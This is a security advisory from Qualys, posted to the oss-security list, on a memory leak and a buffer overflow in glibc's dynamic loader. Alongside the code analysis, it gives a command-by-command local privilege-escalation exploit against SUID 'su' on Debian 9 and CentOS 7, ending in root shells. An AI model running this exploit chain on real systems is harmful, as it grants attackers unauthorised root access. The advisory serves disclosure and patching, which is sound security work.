  oss-security - Qualys Security Advisory - Buffer overflow in glibc's ld.so            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 11 Dec From: Qualys Security Advisory <qsa@...lys.com> To: oss-security@...ts.openwall.com Subject: Qualys Security Advisory - Buffer overflow in glibc's ld.so   Qualys Security Advisory  Buffer overflow in glibc's ld.so   ======================================================================== Contents ========================================================================  Summary Memory Leak Buffer Overflow Exploitation Acknowledgments   ======================================================================== Summary ========================================================================  We have discovered a memory leak and a buffer overflow in the dynamic loader (ld.so) of the GNU C Library (glibc):  - the memory leak first appeared in glibc   (released on May 24, and can be reached and amplified through   the LD_HWCAP_MASK environment variable;  - the buffer overflow first appeared in glibc 2.5   (released on September 29, and can be triggered through the   LD_LIBRARY_PATH environment variable.  Further investigation showed that:  - the buffer overflow is not exploitable if   /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by   default on vanilla Linux kernels, but most Linux distributions turn it   on by default);  - the memory leak and the buffer overflow are not exploitable if the   glibc is patched against because this patch ignores   the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID   binaries are executed was first patched in glibc   released on August 2, but most Linux distributions had   already backported this patch on June 19,  We have therefore rated the impact of these vulnerabilities as Low. Nevertheless, we give a brief analysis of the vulnerable function, and present a simple method for exploiting a SUID binary on the command line and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks is not enabled, and is not patched).   ======================================================================== Memory Leak ========================================================================  ------------------------------------------------------------------------ Analysis ------------------------------------------------------------------------  In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a cache of information about the system's trusted directories (typically "/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit). To compute the number of system directories, ld.so uses the classic C idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":     rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)      malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))              * round_size * sizeof (struct r_search_path_elem));  Unfortunately, "system_dirs" is not a classic array: it is not an array of strings (pointers to characters), but rather an array of characters, the concatenation of all system directories, separated by null bytes:   static const char system_dirs[] = SYSTEM_DIRS;  where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically "/lib/\0/usr/lib/" on 32-bit or on 64-bit). As a result, the number of system directories is overestimated, and too much memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is "/lib/\0/usr/lib/" for example, the number of system directories is 2, but 16 is used instead (the number of characters in "system_dirs") to compute the size of "rtld_search_dirs.dirs[0]".  This extra memory is never accessed, never freed, and mostly filled with null bytes, because only the information about "nsystem_dirs_len" system directories (the correct number of system directories) is written to "rtld_search_dirs.dirs[0]", and because the minimal malloc() implementation in ld.so calls mmap(), but never munmap().  Moreover, this memory leak can be amplified through the LD_HWCAP_MASK environment variable, because ld.so uses "ncapstr" (the total number of hardware-capability combinations) to compute the size of "rtld_search_dirs.dirs[0]":     round_size = ((2 * sizeof (struct r_search_path_elem) - 1                   + ncapstr * sizeof (enum r_dir_status))                  / sizeof (struct r_search_path_elem));  ------------------------------------------------------------------------ History ------------------------------------------------------------------------  We tracked down this vulnerability to:  commit Date:   Mon May 3      Update.          * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.         * elf/gen-trusted-dirs.awk: New file.         * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize         from SYSTEM_DIRS macro.         (system_dirs_len): New variable.  Contains lengths of system_dirs         strings.         (fillin_rpath): Rewrite for systems_dirs being a simple string.         Improve string comparisons.  Change parameter trusted to be a flag.         Change all callers.         (_dt_init_paths): Improve using new format for system_dirs.  which transformed "system_dirs" from an array of strings (pointers to characters) into an array of characters:  -  static const char *system_dirs[] = -  { -#include "trusted-dirs.h" -    NULL -  }; ... +static const char system_dirs[] = SYSTEM_DIRS;   ======================================================================== Buffer Overflow ========================================================================  ------------------------------------------------------------------------ Analysis ------------------------------------------------------------------------  In _dl_init_paths(), ld.so computes "nllp", the number of colon-separated directories in "llp" (the LD_LIBRARY_PATH environment variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1" pointers to "r_search_path_elem" structures (one for each directory in "llp", plus a terminating NULL pointer), and calls fillin_rpath() to fill in "env_path_list.dirs":     if (llp != NULL && *llp != '\0')      {        size_t nllp;        const char *cp = llp;        char *llp_tmp;  ...        nllp = 1;        while (*cp)          {            if (*cp == ':' || *cp == ';')              ++nllp;            ++cp;          }          env_path_list.dirs = (struct r_search_path_elem **)          malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));  ...        (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",                             __libc_enable_secure, "LD_LIBRARY_PATH",                             NULL, l);  Unfortunately, ld.so parses the "llp" string to compute "nllp" but parses the "llp_tmp" string (an expanded copy of "llp") to fill in "env_path_list.dirs". As a result, the number of pointers written to "env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based buffer overflow) if the contents of "llp_tmp" differ from the contents of "llp" (if "llp_tmp" contains more colons than "llp"):         /* Expand DSTs.  */        size_t cnt = DL_DST_COUNT (llp, 1);        if (__glibc_likely (cnt == 0))          llp_tmp = strdupa (llp);        else          {            /* Determine the length of the substituted string.  */            size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);              /* Allocate the necessary memory.  */            llp_tmp = (char *) alloca (total + 1);            llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);          }  The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to fixed strings that do not contain colons (typically "lib" and on 32-bit or "lib64" and on 64-bit), but the expansion of $ORIGIN (the directory of the binary being executed) can inject extra colons into "llp_tmp" and hence extra pointers into "env_path_list.dirs".  To exploit this buffer overflow, a local attacker must therefore be able to:  - hard-link a SUID binary into a directory whose pathname contains   colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);  - pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()   (i.e., must not be patched).  ------------------------------------------------------------------------ History ------------------------------------------------------------------------  We tracked down this vulnerability to:  commit Date:   Tue Aug 29      * elf/dl-load.c (_dl_init_paths): Expand DSTs.  which added the expansion of llp's Dynamic String Tokens (DSTs) to _dl_init_paths():  -      char *llp_tmp = strdupa (llp); +      char *llp_tmp; ... +      /* Expand DSTs.  */ +      size_t cnt = DL_DST_COUNT (llp, 1); +      if (__builtin_expect (cnt == 0, 1)) +       llp_tmp = strdupa (llp); +      else +       { +         /* Determine the length of the substituted string.  */ +         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt); + +         /* Allocate the necessary memory.  */ +         llp_tmp = (char *) alloca (total + 1); +         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1); +       }   ======================================================================== Exploitation ========================================================================  ------------------------------------------------------------------------ Debian 9 ------------------------------------------------------------------------  In this example, we exploit the SUID-root binary "su" on a 32-bit Debian 9.0: we installed (the last release before glibc's was patched), and manually disabled protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").  1/ First, we identify the system's trusted directories (the only directories accepted by fillin_rpath() when executing a SUID binary):  $ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head           find library=nonexistent [0]; searching            search cache=/etc/ld.so.cache            search            (system search path)             trying             trying             trying             trying             trying             trying             trying  The "system search path" line shows four system directories: "/lib", and "/usr/lib" ("tls" and are default hardware capabilities that are enabled even if LD_HWCAP_MASK is 0).  2/ Second, we create our $ORIGIN directory and hard-link the SUID-root binary "su" into it:  $ mkdir -p '/var/tmp/:/lib:/usr/lib:'  $ cd '/var/tmp/:/lib:/usr/lib:'  $ ln `which su` .  The pathname of our $ORIGIN directory contains two system directories: we will write 12 bytes (3 pointers: one for each system directory, plus a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons). In other words, we will overflow "env_path_list.dirs" and write 4 bytes (the terminating NULL pointer) out of bounds.  3/ Third, we overwrite this out-of-bounds NULL pointer with the first bytes of an error message ("cannot open shared object file") that is malloc()ated after "env_path_list.dirs" because of our "nonexistent" preload library. Consequently, ld.so crashes when open_path() tries to open our second preload library "rootshell.so" in a directory described by an "r_search_path_elem" structure located at the unmapped address (the overwritten NULL pointer):  $ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. Segmentation fault  $ dmesg | tail -n 1 segfault at ip sp error 4 in  The "/../../../../../../../../$LIB" suffix is required, to pass the "check_for_trusted" test in _dl_dst_substitute() (our expanded LD_LIBRARY_PATH must be rooted in one of the system's trusted directories).  4/ Next, we copy the library dependencies of "su" to our current working directory, and compile our preload library "rootshell.so" ("la.c" can be found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):  $ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .  $ cat > la.c << "EOF" > static void __attribute__ ((constructor)) _init (void) { >     ... >     // setuid(0); >     ... >     // execve("/bin/sh"); >     ... > } > EOF  $ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c  $ chmod u+s rootshell.so  This "chmod" is required, to pass the SUID-bit test in open_path().  5/ Last, we run "su" with an increasing number of hardware capabilities (i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the "rtld_search_dirs.dirs[0]" occupies the address Because this "rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because an "r_search_path_elem" structure filled with null bytes is equivalent to the current working directory in open_path(), ld.so will eventually load and execute our "rootshell.so" from the current working directory:  $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. Segmentation fault  real    user    sys      ...  $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. # id; exit uid=0(root) gid=0(root)  real    user    sys      6/ Improvements in the running time of this exploit are left as an exercise for the interested reader:  $ env -i LD_LIBRARY_PATH=. LD_PRELOAD=nonexistent LD_DEBUG=libs env 2>&1 | head -c           find library=nonexistent [0]; searching            search  $ mkdir -p  $ mv -- *.so*  $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored. # id; exit uid=0(root) gid=0(root)  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='os-release:rootshell.so' ./su ERROR: ld.so: object 'os-release' from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored. # id; exit uid=0(root) gid=0(root)  real    user    sys      ------------------------------------------------------------------------ CentOS 7 ------------------------------------------------------------------------  In this example, we exploit "su" on a 32-bit CentOS we installed (the last release before was patched), and manually disabled protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").  $ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head          find library=nonexistent [0]; searching           search cache=/etc/ld.so.cache           search                (system search path)            trying            trying file=/lib/tls/nonexistent            trying            trying file=/lib/nonexistent            trying            trying file=/usr/lib/tls/nonexistent            trying  $ mkdir -p '/var/tmp/:/lib:/usr/lib:'  $ cd '/var/tmp/:/lib:/usr/lib:'  $ ln `which su` .  $ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored. Segmentation fault  $ dmesg | tail -n 1 [ segfault at ip sp error 4 in  $ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .  $ cat > la.c << "EOF" > static void __attribute__ ((constructor)) _init (void) { >     ... >     // setuid(0); >     ... >     // execve("/bin/sh"); >     ... > } > EOF  $ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c  $ chmod u+s rootshell.so  $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored. Segmentation fault  real    user    sys      ...  $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored. Segmentation fault  real    user    sys      $ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored. sh-4.2# id; exit uid=0(root) gid=0(root)  real    user    sys       ======================================================================== Acknowledgments ========================================================================  We thank the members of the linux-distros@...nwall list.   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      